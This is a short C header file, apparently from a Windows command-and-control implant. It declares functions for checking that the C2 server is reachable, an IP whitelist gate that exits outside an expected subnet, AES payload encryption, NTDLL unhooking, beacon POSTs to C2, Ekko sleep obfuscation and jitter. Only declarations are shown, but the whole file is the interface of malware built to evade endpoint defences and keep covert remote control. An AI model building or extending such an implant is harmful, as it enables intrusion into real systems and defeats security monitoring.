// include/comms.h
#pragma once
#include <windows.h>

// Connectivity check — verifies C2 is reachable
BOOL checking_connection(BOOL* Connection);

// IP whitelist gate — exits if not in expected subnet
BOOL ip_whitelist_gate();

// AES encrypt/decrypt wrappers
BOOL aes_encrypt_payload(PBYTE plain, DWORD plainLen,
                         PVOID* outCipher, DWORD* outLen);
BOOL aes_decrypt_payload(PBYTE cipher, DWORD cipherLen,
                         PVOID* outPlain, DWORD* outLen);

// NTDLL unhooking
BOOL unhook_ntdll();

// Main beacon POST to C2
BOOL beacon_post(BYTE* payload, DWORD payloadLen,
                 BYTE** responseOut, DWORD* responseLenOut);

// Ekko sleep obfuscation
VOID ekko_sleep(DWORD sleepMs);

// Jitter helper
DWORD jitter(DWORD baseMs);

// Get current machine IP address
ULONG GetCurrentIpAddress();
